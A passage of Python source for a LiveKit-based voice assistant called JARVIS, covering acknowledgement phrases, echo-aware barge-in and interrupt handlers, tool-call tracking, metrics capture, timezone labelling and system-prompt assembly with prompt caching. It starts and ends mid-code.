                                            "Hold on.",
                                            "Give me a sec.",
                                            "Looking into that.",
                                            "Thinking…",
                                        )
                                        phrase = random.choice(_FRONT_ACK_PHRASES)
                                        _sess.say(
                                            phrase,
                                            allow_interruptions=True,
                                            add_to_chat_ctx=False,
                                        )
                                        _sess._jarvis_front_ack_fired = True
                                        logger.info(f"[front-ack] voiced {phrase!r} (LLM still pending)")
                                    except Exception as _say_e:
                                        logger.debug(f"[front-ack] say failed: {_say_e}")
                            except asyncio.CancelledError:
                                pass
                        session._jarvis_front_ack_task = asyncio.create_task(_front_loaded_ack())
                    else:
                        session._jarvis_front_ack_task = None
            except Exception as _ack_e:
                logger.debug(f"[front-ack] schedule skipped: {_ack_e}")
        elif new_state in ("idle", "listening"):
            # Heartbeat owns _AGENT_THINKING_FILE — cancel happens in
            # _on_item (final_reply detection) or in barge-in paths,
            # not here. Keep _mark_tool_end() since the tool-busy file
            # is separate from the thinking flag.
            _mark_tool_end()
            # Cancel the front-loaded ack — the LLM has settled (either
            # text is flowing to TTS, or the turn ended without a reply).
            try:
                session._jarvis_front_ack_fired = True  # block delayed firing
                ack_task = getattr(session, "_jarvis_front_ack_task", None)
                if ack_task is not None and not ack_task.done():
                    ack_task.cancel()
                session._jarvis_front_ack_task = None
            except Exception:
                pass
            # Backstop heartbeat cancel (2026-05-30). _on_item normally
            # cancels the thinking heartbeat on the final assistant reply,
            # but a turn can end with NO final item — e.g. the framework
            # logs "skipping reply to user input, current speech generation
            # cannot be interrupted" — and _on_item never fires, orphaning
            # the heartbeat so the tray stays amber forever (live 2026-05-30:
            # stuck "thinking" ~4min after a computer_use turn). Debounced so
            # the framework's transient sub-second "listening" between tool
            # calls doesn't cancel mid-turn.
            _schedule_idle_heartbeat_cancel(session)

        # total_audio_ms tracking: accumulate every "speaking" segment
        # within a turn. Multi-segment turn (speaking → thinking →
        # speaking after a tool call) sums correctly; a barge-in
        # captures the partial duration. Read + reset at turn-end in
        # the log_turn() block.
        try:
            _now_mono = time.monotonic()
            if new_state == "speaking" and old_state != "speaking":
                session._jarvis_agent_speaking_started_at = _now_mono
            elif old_state == "speaking" and new_state != "speaking":
                # Echo-aware barge-in: snapshot what JARVIS just said so a
                # phantom echo-turn finalizing post-endpointing can be matched
                # against it (pipeline/echo_gate consumer B, via speaking_tracker).
                try:
                    from pipeline import speaking_tracker
                    speaking_tracker.mark_speech_ended()
                except Exception:
                    pass
                started = getattr(session, "_jarvis_agent_speaking_started_at", None)
                if started is not None:
                    seg_ms = int((_now_mono - started) * 1000)
                    if seg_ms > 0:
                        prior = getattr(session, "_jarvis_agent_audio_ms_acc", 0) or 0
                        session._jarvis_agent_audio_ms_acc = prior + seg_ms
                    session._jarvis_agent_speaking_started_at = None
        except Exception as e:
            logger.debug(f"[total_audio_ms] tracking skipped: {e}")

    # STT finalised a user turn — LLM is about to start generating.
    # Touch the thinking flag so the tray goes gold immediately.
    # Also bumps the audio-silence watchdog so it doesn't trip — any
    # transcript (interim or final) proves audio is flowing from the
    # voice-client to the agent through a healthy LiveKit subscription.
    @session.on("user_input_transcribed")
    def _on_user_input(ev) -> None:
        _update_lang_from_stt_event(session._jarvis_lang_ctx, ev)
        try:
            from resilience import audio_silence_watchdog as _asw
            _asw.mark_audio_activity()
        except Exception:
            pass
        if getattr(ev, "is_final", True):
            # Start the indicator heartbeat. Heartbeat runs from now
            # until the FINAL assistant reply lands (text-only, no
            # tool_use) or until the turn is barge-in / interrupted.
            # Replaces the prior agent_state-driven _mark_thinking_start
            # call — see docs/superpowers/specs/2026-05-27-post-tool-reply-gate-and-indicator-heartbeat.md
            _start_thinking_heartbeat(session)
            _reset_tool_call_count()
            # Reset per-turn tool-calls list consumed by the pre-TTS
            # confab gate. Populated by the function_tools_executed
            # handler below as the supervisor's tools fire this turn.
            try:
                session._jarvis_tool_calls_this_turn = []
                session._jarvis_confab_check_state = None
                session._jarvis_confab_pattern_matched = None
                session._jarvis_confab_retry_models = []
                session._jarvis_text_recovery_fired = False
            except Exception:
                pass
            # Reset front-ack gate for the new turn. Cancel any stale
            # task left over from the previous turn (defensive — the
            # idle/listening branch of _on_agent_state normally
            # cancels it, but on tightly-packed back-to-back turns
            # the new user input can arrive before that fires). The
            # `fired` flag is the load-bearing turn-scope gate that
            # prevents the multi-firing observed 2026-05-27.
            try:
                prior_ack = getattr(session, "_jarvis_front_ack_task", None)
                if prior_ack is not None and not prior_ack.done():
                    prior_ack.cancel()
                session._jarvis_front_ack_task = None
                session._jarvis_front_ack_fired = False
            except Exception:
                pass
            # Bump the dispatch_agent session-id slot so any in-flight
            # subagent from a prior turn discards its stale result on
            # completion. New per-turn defaults for telemetry too.
            try:
                from tools import dispatch_agent as _da
                _da._active_session_token[0] = object()
            except Exception:
                pass
            session._jarvis_subagent_type = None
            session._jarvis_subagent_ms = None
            session._jarvis_subagent_status = None

    # Pre-TTS confab gate (2026-05-24): track this turn's tool-call list
    # so `should_gate()` can decide whether a "claimed action" reply is
    # backed by a tool call. The list is reset on each final user input
    # transcript (above) and appended here on every function-tool batch
    # execution within the turn.
    @session.on("function_tools_executed")
    def _on_function_tools_executed(ev) -> None:
        try:
            calls = list(getattr(ev, "function_calls", None) or [])
            if not calls:
                return
            _bump_turn_activity(session)  # tool batch ran = genuine turn progress
            # Tool-batch completion is no longer a moment we need to
            # re-touch the thinking-flag file — the heartbeat (started
            # in _on_user_input) refreshes it every 3s for the whole
            # turn. Kept this handler for the dispatch_agent telemetry
            # stash + tool-calls accumulator that follow.
            # Stash dispatch_agent telemetry from the module-level side-channel.
            # The handler in tools/dispatch_agent.py writes _last_dispatch from a
            # try/finally so every exit path (success/timeout/error/cancelled/etc.)
            # is recorded — even if the framework abandoned the call mid-flight or
            # the JSON output is missing/odd-shaped (which the prior output-parsing
            # approach couldn't handle).
            try:
                from tools.dispatch_agent import _last_dispatch as _da_last
                if _da_last.get("type") and _da_last.get("status"):
                    session._jarvis_subagent_type = _da_last["type"]
                    session._jarvis_subagent_ms = _da_last["ms"]
                    session._jarvis_subagent_status = _da_last["status"]
                    # Clear the slot so a stale value doesn't leak into the next
                    # turn. Turn-start (_on_user_input is_final=True) ALSO resets
                    # the session attrs; this clears the module slot for safety.
                    _da_last["type"] = None
                    _da_last["ms"] = None
                    _da_last["status"] = None
            except Exception:
                pass
            current = list(getattr(session, "_jarvis_tool_calls_this_turn", None) or [])
            current.extend(calls)
            session._jarvis_tool_calls_this_turn = current
        except Exception as e:
            logger.debug(f"[pre_tts_gate] tool-calls tracking skipped: {e}")

    @session.on("user_input_transcribed")
    def _on_user_input_kill_phrase(ev) -> None:
        try:
            text = (getattr(ev, "transcript", "") or "").strip()
            if not text or not _KILL_PHRASES.search(text):
                return
            agent_state = getattr(session, "agent_state", "")
            if agent_state != "speaking":
                return
            logger.info(f"[kill-phrase] '{text[:60]!r}' detected mid-speech → forcing interrupt")
            session.interrupt(force=True)  # force: speeches are non-interruptible when echo-aware mode disables framework interruption
            _cancel_thinking_heartbeat(session)
            session._jarvis_was_interrupted = True
        except Exception as e:
            logger.debug(f"[kill-phrase] check skipped: {e}")

    @session.on("user_input_transcribed")
    def _on_user_input_echo_aware_interrupt(ev) -> None:
        """Echo-aware barge-in (2026-05-20). With a hot mic during TTS, the
        raw VAD-direct handler can't tell the user from JARVIS's own echo.
        This fires interrupt only when the (streaming Nova-3) transcript
        carries NOVEL words — not JARVIS echoing back. Echo → ignored.
        Spec: docs/superpowers/specs/2026-05-20-echo-aware-bargein-gate-design.md
        """
        try:
            from pipeline import echo_gate, speaking_tracker
            if not echo_gate.enabled():
                return
            if getattr(session, "agent_state", "") != "speaking":
                return
            text = (getattr(ev, "transcript", "") or "").strip()
            if not text:
                return
            # honor_cooldown=True: this is the interrupt path, where the
            # post-barge-in cooldown suppresses residual TTS-tail echo from
            # re-firing the interrupt. The turn-admission drop_echo check
            # (on_user_turn_completed) deliberately does NOT pass it, so the
            # genuine turn that triggered this barge-in isn't dropped.
            if echo_gate.is_echo(
                text, speaking_tracker.current_speaking_text(), honor_cooldown=True
            ):
                return  # JARVIS hearing itself — not a real interruption
            logger.info(f"[echo-bargein] novel speech during TTS → interrupt: {text[:60]!r}")
            echo_gate.note_bargein()  # arm cooldown so residual echo from cancelled TTS doesn't re-trigger
            session.interrupt(force=True)  # force: framework interruption is disabled in echo-aware mode, so a plain interrupt() would raise + no-op
            _cancel_thinking_heartbeat(session)
            session._jarvis_was_interrupted = True
        except Exception as e:
            logger.debug(f"[echo-bargein] check skipped: {e}")

    @session.on("user_state_changed")
    def _on_user_state_for_interrupt(ev) -> None:
        """VAD-direct barge-in (Path A step 1, 2026-05-18).

        The framework's own barge-in path waits for STT min_words +
        min_duration confirmation before firing interrupt. With Groq
        Whisper Turbo (non-streaming) that confirmation only arrives
        AFTER the user stops talking — way too late. This handler
        fires `session.interrupt()` the moment Silero VAD reports the
        user started speaking (≈50–100 ms after voice onset), without
        waiting for STT.

        That in turn task-cancels the active TTS `_run()`, which fires
        the CancelledError catch in `providers/tts.py` and aborts the
        Orpheus HTTP socket. End-to-end: VAD onset → interrupt → TTS
        cancel → resp.close() in <300 ms.

        Trade-off: a 50 ms cough / breath now interrupts JARVIS.
        Mitigations already in place (Silero min_speech=0.05 s,
        PipeWire echo-cancel-source, APM noise-suppression).
        """
        try:
            new_state = getattr(ev, "new_state", None)
            if new_state != "speaking":
                return
            agent_state = getattr(session, "agent_state", "")
            if agent_state != "speaking":
                return
            # Echo-aware barge-in: the raw VAD onset is echo-blind (a hot mic
            # hears JARVIS's own voice). In echo-aware mode, defer the interrupt
            # decision to the STT-partial handler above, which compares the
            # transcript against what JARVIS is saying. (pipeline/echo_gate)
            try:
                from pipeline import echo_gate
                if echo_gate.enabled():
                    return
            except Exception:
                pass
            # Mark for telemetry first (preserves the old behaviour
            # other code may rely on).
            session._jarvis_was_interrupted = True
            # Fire the interrupt. session.interrupt() returns a future;
            # we don't await — the cancellation propagates through the
            # framework's task graph and the TTS stream gets cancelled
            # by the StreamAdapter on its own loop.
            logger.info(
                "[vad-barge-in] user started speaking during TTS → forcing interrupt"
            )
            session.interrupt()
            _cancel_thinking_heartbeat(session)
        except Exception as e:
            logger.debug(f"[interrupt-detect] skipped: {e}")

    # Per-turn LLM usage capture (global review §P0-17). Wires the
    # AgentSession's `metrics_collected` event into session._jarvis_last_*
    # fields so log_turn reads non-None values and `cost_usd` actually
    # gets computed. Critically captures `prompt_cached_tokens` so we
    # can VERIFY Anthropic's `caching="ephemeral"` is hitting
    # (telemetry-only, no behaviour change). The event is "deprecated"
    # upstream but still emits; the replacement `session_usage_updated`
    # is cumulative-per-session, not per-turn, which doesn't fit our
    # one-row-per-turn telemetry shape.
    @session.on("metrics_collected")
    def _on_metrics_collected(ev) -> None:
        try:
            m = getattr(ev, "metrics", None)
            if m is None:
                return
            # LLMMetrics has: prompt_tokens, completion_tokens,
            # prompt_cached_tokens, total_tokens. Other metric types
            # (STT/TTS/VAD/EOU) reuse the event but the fields differ.
            if getattr(m, "type", None) != "llm_metrics":
                return
            session._jarvis_last_input_tokens = getattr(m, "prompt_tokens", None)
            session._jarvis_last_output_tokens = getattr(m, "completion_tokens", None)
            session._jarvis_last_cache_read_tokens = getattr(m, "prompt_cached_tokens", 0) or 0
        except Exception as e:
            logger.debug(f"[metrics-capture] skipped: {e}")


def _iana_timezone_name() -> str:
    """IANA zone name (e.g. "America/New_York") of the system timezone.

    `datetime.now().astimezone().tzinfo` only carries the abbreviation
    ("EDT"), never the IANA name — that has to come from the zoneinfo
    link. Returns "" when undeterminable."""
    try:
        target = os.readlink("/etc/localtime")
        if "/zoneinfo/" in target:
            return target.split("/zoneinfo/", 1)[1]
    except OSError:
        pass
    try:
        return Path("/etc/timezone").read_text(encoding="utf-8").strip()
    except OSError:
        return ""


def _local_timezone_label() -> str:
    """Return a human-readable local timezone label for the prompt.

    Uses the system's configured timezone (e.g. "America/New_York
    (US Eastern, currently EDT/UTC-4)"). Falls back to UTC if the
    system timezone can't be determined."""
    try:
        from datetime import datetime
        now = datetime.now().astimezone()
        tz = now.tzinfo
        if tz is None:
            return "UTC (unknown local — system timezone not set)"
        tz_abbrev = str(tz)            # fixed-offset abbreviation, e.g. "EDT"
        offset = now.strftime("%z")
        # Format offset like "-04:00" → "UTC-4"
        if offset and len(offset) == 5:
            sign = offset[0]
            hours = offset[1:3].lstrip("0") or "0"
            minutes = offset[3:5]
            if minutes == "00":
                offset_label = f"UTC{sign}{hours}"
            else:
                offset_label = f"UTC{sign}{hours}:{minutes}"
        else:
            offset_label = "UTC"
        iana = _iana_timezone_name()
        if iana:
            friendly = _FRIENDLY_TZ_NAMES.get(iana, "")
            if friendly:
                return f"{iana} ({friendly}, currently {tz_abbrev}/{offset_label})"
            return f"{iana} (currently {tz_abbrev}/{offset_label})"
        return f"{tz_abbrev} ({offset_label})"
    except Exception:
        return "UTC (local timezone lookup failed)"


# Friendly labels for common timezones
_FRIENDLY_TZ_NAMES = {
    "America/New_York":    "US Eastern",
    "America/Chicago":     "US Central",
    "America/Denver":      "US Mountain",
    "America/Los_Angeles": "US Pacific",
    "America/Anchorage":   "US Alaska",
    "Pacific/Honolulu":    "US Hawaii",
    "Europe/London":       "UK",
    "Europe/Paris":        "Central European",
    "Europe/Berlin":       "Central European",
    "Asia/Tokyo":          "Japan",
    "Asia/Shanghai":       "China",
    "Asia/Kolkata":        "India",
    "Australia/Sydney":    "Australian Eastern",
    "Africa/Douala":       "West Africa (Cameroon)",
}


def _build_runtime_id_block(active_speech_id: str) -> str:
    """Build the WHO YOU ARE prompt block with current model identity.
    Step 8d of the 10/10 refactor. Reads the CLI model live from the
    file so a tray switch is reflected on the next session start.

    Used by the supervisor to answer "what model are you?" / "what's
    powering you?" correctly — without this, the LLM gives the vague
    "I'm a conversational AI" because LLMs don't know their own
    underlying model unless told.

    Also includes the local timezone (2026-06-09) so the supervisor
    converts UTC timestamps to local time by default instead of
    speaking raw UTC times.
    """
    cli_model_id = read_cli_model()
    cli_def = CLI_MODELS.get(cli_model_id, {})
    cli_label = cli_def.get("label", cli_model_id)
    speech_label = SPEECH_MODELS.get(active_speech_id, {}).get(
        "label", active_speech_id,
    )
    tz_label = _local_timezone_label()
    return (
        "\n\n═══ WHO YOU ARE ═══\n\n"
        "When the user asks what model you're using, what's powering\n"
        "you, what stack you're on, or similar identity questions,\n"
        "answer plainly with the active configuration:\n"
        f"  - Speech LLM (the one composing this reply): {speech_label}.\n"
        f"  - Tool model (the one that runs run_jarvis_cli): {cli_label}.\n"
        f"  - Speech-to-text: {VOICE_STT_LABEL}.\n"
        f"  - Text-to-speech: {VOICE_TTS_LABEL}.\n"
        "If the user asks a vaguer 'what model' question, lead with\n"
        "the speech LLM and offer the tool model as 'and for tool work'.\n"
        "Don't say you don't know — you do, it's right here.\n"
        "\n═══ TIMEZONE ═══\n\n"
        f"The user's local timezone is {tz_label}.\n"
        "When you read timestamps from databases, tools, or\n"
        "conversation history they are ALWAYS in UTC. CONVERT\n"
        "them to the user's local timezone before speaking the\n"
        "time. Never speak a UTC timestamp aloud unless the\n"
        "user explicitly asks for UTC.\n"
        "The `current_time` tool with an empty timezone argument\n"
        "returns the user's local time — use it to verify the\n"
        "current time offset if you're unsure about DST status.\n"
    )


def _build_memory_block() -> str:
    """Build the memory section of the system prompt — the FROZEN
    MEMORY.md + USER.md snapshot captured at session start
    (pipeline.file_memory). Returns "" when both stores are empty.

    Frozen-snapshot semantics (matches the file-backed memory model):
    the snapshot is captured once when the store first loads and does
    NOT change mid-session, so the system-prompt prefix stays stable and
    the provider-side prefix cache is never invalidated by a memory edit.
    A `memory` tool write updates the files on disk immediately (durable)
    but the prompt only reflects it on the NEXT session start.

    Still called both at session start and per-turn by the dispatch
    handler; because the value is constant for the session, the per-turn
    caller's no-op comparison means zero prompt churn.
    """
    if not _MEMORY_AVAILABLE:
        return ""
    try:
        block = file_memory.snapshot_for_prompt()
        if not block:
            return ""
        return "\n\n" + block
    except Exception as e:
        logger.warning(f"[memory] block render failed: {e}")
        return ""


def _build_recent_sessions_block() -> str:
    """Build a compact recent-sessions summary for the system prompt.

    Queries ``~/.jarvis/conversations.db`` for the last 5 sessions (ended
    within the last 7 days or still active) and returns a compact block
    with relative time, title, and turn count. Returns "" when the DB
    has no prior sessions or is unavailable.

    Goes into the volatile suffix (changes per-session) so the stable
    prefix cache is never invalidated. The block is small (~200-500 chars)
    — deep lookup uses the ``recall_conversation`` tool instead.
    """
    try:
        from pipeline import conversation_store
        block = conversation_store.get_recent_sessions(limit=5)
        if not block:
            return ""
        return "\n\n" + block
    except Exception as e:
        logger.warning(f"[conversation] recent-sessions block failed: {e}")
        return ""


# _build_pending_proposals_block — deleted 2026-05-12 alongside the
# rest of the log_analyzer subsystem. Autonomous evolution doesn't
# need a pending-review nag injected into the supervisor prompt.


def _build_initial_prompt_state(active_speech_id: str) -> dict:
    """Assemble every piece of state the supervisor system-prompt
    depends on at session start. Step 8d of the 10/10 refactor —
    consolidates 5 previously-inline blocks in entrypoint() (runtime
    id, learned-rules load, pending-proposals notice, memory facts,
    breaker status) into one named phase.

    Returns a dict with everything entrypoint needs to construct the
    JarvisAgent + later refresh the prompt mid-session.

    Stable / volatile split (2026-05-23 cache refactor)
    ---------------------------------------------------
    The assembled prompt is structured for provider-side prefix
    caching: the STABLE PREFIX (SOUL + JARVIS_INSTRUCTIONS +
    skill_catalog_block) goes FIRST and never changes mid-session;
    the VOLATILE SUFFIX (runtime_id + memory_block + breaker_block)
    goes LAST and changes on per-session boot, memory writes, and
    breaker flips. The two are joined with the
    ``CACHE_BREAK_MARKER`` sentinel from ``providers.prompt_cache`` so
    the Anthropic + Gemini wrappers (or the supervisor handing in the
    expected stable prefix via setter) can place their cache
    breakpoint at the boundary. OpenAI / DeepSeek / Groq auto-cache on
    prefix-match and don't need a wrapper — the stable-first ordering
    is what activates their caches.

    Returned keys:

      - stable_prefix       : SOUL + JARVIS_INSTRUCTIONS + skill_catalog
                              (cache-eligible, session-stable)
      - volatile_suffix     : runtime_id + memory_block + breaker_block
                              + recent_sessions_block
                              (changes mid-session)
      - instructions_prefix : SOUL + JARVIS_INSTRUCTIONS + runtime-id
                              (legacy key — preserved for turn_dispatcher
                              hot-reload backward compat; do NOT use for
                              cache decisions)
      - memory_block        : frozen MEMORY.md + USER.md snapshot (or "")
      - breaker_block       : upstream-provider health (or "")
      - skill_catalog_block : skill catalog text (session-stable)
      - recent_sessions_block: compact recent-sessions summary (or "")
      - initial_instructions: the assembled full system prompt
                              (= stable_prefix + marker + volatile_suffix)
    """
    # Freeze the file-backed memory snapshot for THIS session. Loading here
    # (rather than relying on lazy first-access) makes the freeze point
    # explicit + deterministic: every later _build_memory_block() call —
    # session start and per-turn — returns this same snapshot, so the
    # system-prompt prefix never changes mid-session.
    if _MEMORY_AVAILABLE:
        try:
            file_memory.reload_store()
        except Exception as e:
            logger.warning(f"[memory] snapshot load failed: {e}")

    runtime_id_block = _build_runtime_id_block(active_speech_id)

    # SOUL (prompts/soul.md) leads as slot #1 — identity/voice first,
    # then the operational rules (JARVIS_INSTRUCTIONS = supervisor.md).
    # The legacy `instructions_prefix` ALSO carries the runtime-id (kept
    # for backward compat with any readers still expecting that shape),
    # but for cache purposes runtime-id moves to the volatile suffix
    # because it's session-bound.
    instructions_prefix = SOUL + "\n\n" + JARVIS_INSTRUCTIONS + runtime_id_block

    memory_block = _build_memory_block()

    # Recent conversation sessions — compact summary injected so the
    # supervisor knows what was recently discussed. Queries
    # conversations.db; returns "" when no prior sessions exist.
    recent_sessions_block = _build_recent_sessions_block()

    # Audit-rec F (2026-05-09): inject breaker status into the prompt
    # so the supervisor knows when to acknowledge upstream-provider
    # degradation rather than going silent during a fallback. Empty
    # string when all breakers are healthy (zero prompt cost in the
    # steady state).
    breaker_block = _build_breaker_status_block()

    # Task 3a (2026-05-22): inject the skill catalog so the supervisor is
    # aware of what skills exist and can consult/patch them. Built once
    # here (session-stable) alongside the memory + breaker blocks —
    # never rebuilt per-turn, so the prefix cache stays warm. Empty string
    # when SKILLS is empty (zero prompt cost in the default no-skills state).
    skill_catalog_block = _build_skill_catalog_block()

    # Stable / volatile split — see docstring. ``skill_catalog_block``
    # is treated as stable for cache purposes per spec (the inventory
    # changes rarely, and only via explicit skill mgmt). ``runtime_id``
    # moves into the volatile suffix because it carries the per-session
    # speech-LLM label and the tool-model id (both potentially churn
    # across sessions or after a tray swap).
    stable_prefix = (
        SOUL
        + "\n\n"
        + JARVIS_INSTRUCTIONS
        + skill_catalog_block
    )
    volatile_suffix = runtime_id_block + memory_block + breaker_block + recent_sessions_block

    # Late import keeps the module's top-level import graph clean — this
    # symbol is only consumed by `_build_initial_prompt_state` and the
    # turn_dispatcher hot-reload path, both of which run after process
    # boot.
    from providers.prompt_cache import assemble_with_marker

    initial_instructions = assemble_with_marker(stable_prefix, volatile_suffix)

    return {
        # Cache-aware keys (new in 2026-05-23 refactor).
        "stable_prefix":        stable_prefix,
        "volatile_suffix":      volatile_suffix,
        # `runtime_id_block` exposed separately so the turn_dispatcher
        # hot-reload can rebuild the volatile suffix as
        # `runtime_id_block + new_memory_block + new_breaker_block`
        # without parsing it back out of the joined volatile_suffix.
        "runtime_id_block":     runtime_id_block,
        # Legacy keys — preserved for turn_dispatcher.make_dispatch_handler
        # which still reads `instructions_prefix` / `memory_block` /
        # `breaker_block` / `skill_catalog_block` to rebuild on hot-reload.
        "instructions_prefix":  instructions_prefix,
        "memory_block":         memory_block,
        "breaker_block":        breaker_block,
        "skill_catalog_block":  skill_catalog_block,
        "recent_sessions_block": recent_sessions_block,
        "initial_instructions": initial_instructions,
    }


async def maybe_publish_assistant_says(
    *,
    room: "rtc.Room",
    item: object,
    role: str | None,
    text: str | None,
) -> None:
    """Mirror an assistant chat item to the LiveKit data channel as
    `{"type": "assistant_says", "text", "ts_ms"}`. Idempotent — tags
    the item with `_jarvis_published_says=True` on first publish and
    no-ops on subsequent calls for the same item.

    Used by the conversation_item_added handler to feed the desktop
    tray chat panel (and any other future SSE subscriber). Errors are
    logged at debug and swallowed — a publish failure must not break
    voice-mode chat-ctx accounting.
    """
    if role != "assistant":
        return
    if not (text or "").strip():
        return
    if getattr(item, "_jarvis_published_says", False):
        return
    try:
        import json as _json_pub
        payload = _json_pub.dumps({
            "type": "assistant_says",
            "text": text,
            "ts_ms": int(time.monotonic() * 1000),
        }).encode("utf-8")
        try:
            item._jarvis_published_says = True
        except Exception:
            # Read-only item (e.g. __slots__) — best effort. May
            # double-publish on re-fire; LiveKit + the SSE subscriber
            # set both tolerate that.
            pass
        await room.local_participant.publish_data(payload, reliable=True)
    except Exception as _e:
        logger.debug(f"[chat-panel] assistant_says publish failed: {_e!r}")


async def _automod_tick() -> None:
    """One evolution pass: always scan (queue intents for review); BUILD only in
    AUTO mode. Extracted module-level so it's unit-testable. Phase 1, 2026-06-23
    cognitive-loop (docs/superpowers/plans/2026-06-23-cognitive-evolution-loop-phase1.md)."""
    from pipeline.automod import patterns as _automod_patterns
    from pipeline.automod import spawner as _automod_spawner
    from pipeline.automod._state import is_auto_mode
    # Stamp the heartbeat first — proves the in-process loop is alive and records
    # WHY it will/won't build this tick (idle/cooldown/budget/mode), so the
    # /evolution page can show "auto · waiting: cooldown 34m" instead of silence.
    try:
        from pipeline.automod import heartbeat as _automod_heartbeat
        _automod_heartbeat.beat()
    except Exception:  # noqa: BLE001 — liveness must never break the tick
        pass
    _automod_patterns.scan_and_emit()
    if is_auto_mode():
        await _automod_spawner.drain_queue()


async def entrypoint(ctx: JobContext) -> None:
    """
    Runs once per client that joins a room. This is the actual
    conversation loop — AgentSession handles the VAD → STT → LLM →
    TTS plumbing internally; we just wire the pieces and let it
    drive.

    Also listens on the LiveKit data channel for {"type": "speak",
    "text": "..."} messages. This lets the Tauri UI (or any other
    client) ask the agent to voice arbitrary text through the same
    TTS pipeline the conversation uses, rather than maintaining a
    separate TTS path. Triggered today when the typed-text chat
    path emits a `chat_response` over the bridge WS.
    """
    await ctx.connect()
    logger.info(f"joined room: {ctx.room.name}")

    # Audio-silence watchdog: mark this fresh job's start clock + spawn
    # the background deadman loop. If the LiveKit subscription lands in
    # a zombie state (job dispatched but no audio frames flow — observed
    # 2026-05-17 with three back-to-back occurrences each followed by
    # ~50min of silence), the watchdog forces sys.exit(1) after 90s and
    # systemd respawns us with a clean subscription. Idempotent — the
    # second call returns the existing task instead of spawning twice.
    try:
        from resilience import audio_silence_watchdog as _asw
        _asw.mark_job_started()
        _asw.start_audio_silence_watchdog_task()
    except Exception as e:
        logger.warning(f"[audio-silence] wiring failed: {type(e).__name__}: {e}")

    # Initialize Maya-class telemetry SQLite. Failures are silent.
    try:
        init_db(DEFAULT_DB_PATH)
    except Exception as e:
        logger.warning(f"[telemetry] init_db failed: {e}")

    # Initialize conversation persistence SQLite. Failures are silent.
    try:
        from pipeline import conversation_store
        conversation_store.init_db()
    except Exception as e:
        logger.warning(f"[conversation] init_db failed: {e}")

    # Install the auto-mod error telemetry handler. Captures recurring
    # exceptions from this process for the auto-mod error-driven scanner
    # to detect. Idempotent — re-install is a no-op. The handler reads
    # the same telemetry DB that init_db() just initialized.
    # Spec: docs/superpowers/specs/2026-05-27-automod-error-driven-branch-design.md
    try:
        from pipeline.automod.error_logger import install_error_handler
        install_error_handler()
    except Exception as _e:
        logger.warning(f"[automod] error handler install failed: {_e}")

    # Clear any stale thinking/tool flags from a prior crashed agent.
    # If we leave them, the new fresh agent reports "thinking" forever
    # until the next user turn fires user_input_transcribed.
    _mark_thinking_end()
    _mark_tool_end()
    # Auto-clear silent-mode if the lock is older than 4 hours — see
    # _clear_stale_silent_mode docstring. Recent locks (deliberate
    # short-term mutes) are preserved; ancient locks (forgotten / the
    # LLM hallucinated a "going quiet" hours ago) get cleared so a
    # reconnecting user isn't trapped in unexpected silence.
    _clear_stale_silent_mode()
    # Don't auto-clear silent mode on agent restart — it's a user
    # preference that should persist across speech-model switches and
    # incidental restarts. The user toggles it explicitly via voice
    # ("wake up") when they want JARVIS back.

    # Reset per-session computer-use approval so a fresh session never
    # inherits an "always approve" the user granted in a prior session
    # (the grant state is module-level, i.e. process-lived). Best-effort.
    try:
        from tools import computer_use as _cu
        _cu.reset_session_approval()
    except Exception as _e:
        logger.debug(f"[boot] computer_use approval reset skipped: {_e}")

    # Build the LLM/TTS provider stack from the user's tray pick. Done
    # HERE rather than at module load so a /voice-model POST + systemctl
    # restart picks up the new file on the very next job.
    _stack = _build_llm_stack()
    active_speech_id   = _stack["speech_id"]
    _active_speech_llm = _stack["speech_llm"]
    _dispatch_llm      = _stack["dispatch_llm"]
    _dispatch_tts      = _stack["dispatch_tts"]
    _turn_graph        = _stack["turn_graph"]
    _turn_classifier   = _stack["turn_classifier"]
    llm_arg            = _stack["llm_arg"]
    tts_arg            = _stack["tts_arg"]

    # No handoff subagents in this build (subagent teardown). The
    # picker ignores `subagent_tools` anyway (returns legacy_llm); pass
    # an empty list to keep the call-site signature stable.
    llm_arg = _pick_supervisor_llm(
        subagent_tools=[],
        legacy_llm=llm_arg,
    )
    # Proof of what the session ACTUALLY runs: 'FallbackAdapter' means the pin
    # fallback survived to the session; a bare LLM class means it didn't. (The
    # 2026-07-02 no-op bug would have shown a bare class here despite the
    # "pin fallback armed" log firing upstream.)
    logger.info(
        f"[dispatch] final supervisor LLM → session: {type(llm_arg).__name__} "
        f"label={getattr(llm_arg, '_jarvis_label', None)!r}"
    )

    session = AgentSession(
        # 2026-05-02: raised from livekit's default 3 to 15. Browser
        # subagent chains commonly need 5+ tool calls (navigate,
        # wait_for_load, observe, type, keypress) and 3 was burning
        # the budget on retries — 'maximum number of function calls
        # steps reached' truncated the chain mid-task. 15 leaves
        # headroom for login + form + submit (~8) without enabling
        # runaway loops.
        max_tool_steps=15,
        vad=ctx.proc.userdata["vad"],
        # STT chain: local faster-whisper (large-v3-turbo, GPU). The live
        # default is 100% on-device (JARVIS_STT_LOCAL_ONLY=1, 2026-06-21).
        # _build_stt_chain still supports an optional Deepgram Nova-3
        # streaming primary when DEEPGRAM_API_KEY is set and local-only is
        # off; the Groq Whisper rung was removed 2026-06-29. Barge-in is
        # VAD-gated (faster-whisper is finals-only), not STT-confirmed.
        stt=_build_stt_chain(vad=ctx.proc.userdata.get("vad")),
        # Speech LLM — switchable via the tray's "Models" submenu.
        # Default is deepseek-chat (DEFAULT_SPEECH_MODEL); Groq was
        # removed 2026-06-29. Switching writes ~/.jarvis/voice-model and
        # bounces the agent unit, so the new LLM is built on next startup
        # (read_speech_model() fires below as we exit entrypoint and
        # re-enter on the fresh job dispatch).
        # When Maya dispatcher is active, llm_arg is the TASK fallback;
        # per-turn callback swaps to route-specific inner.
        llm=llm_arg,
        # ── TTS chain ───────────────────────────────────────────────
        # Provider order is controlled by ~/.jarvis/tts-provider
        # (written by the tray's "Voice" submenu via /tts-provider).
        # Format: "<provider>:<voice>" — only `groq:<voice>` is
        # supported (ElevenLabs removed 2026-05-01). Final fallback
        # is Edge-TTS (no auth, always available). When Maya dispatcher
        # is active, tts_arg is the TASK voice.
        tts=tts_arg,
        # ── Barge-in / multitask tuning ─────────────────────────────
        # Defaults make JARVIS feel "deaf while speaking": the agent
        # keeps talking through the user's next request, then queues
        # a stale reply. These knobs make the interrupt fast and
        # graceful so the user can start a new turn mid-sentence.
        # Shape: TurnHandlingOptions TypedDict with three sections.
        turn_handling={
            "interruption": {
                # 2026-05-20 echo-aware barge-in: when the echo gate is ON
                # (default), DISABLE the framework's built-in VAD interruption —
                # with a hot mic during TTS it would self-interrupt on JARVIS's
                # OWN echo, independent of our handlers. JARVIS's echo-aware
